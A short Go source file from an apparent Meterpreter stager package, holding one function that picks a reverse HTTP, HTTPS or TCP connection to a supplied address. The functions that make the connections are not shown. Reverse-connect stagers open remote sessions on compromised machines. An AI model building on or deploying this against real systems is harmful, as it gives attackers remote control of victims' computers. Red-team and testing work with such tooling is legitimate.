package meterpreter

func Meterpreter(connType, address string) (bool, error) {
	var (
		ok  bool
		err error
	)
	switch {
	case connType == "http" || connType == "https":
		ok, err = ReverseHttp(connType, address)
	case connType == "tcp":
		ok, err = ReverseTcp(address)
	default:
		ok = false
	}

	return ok, err
}
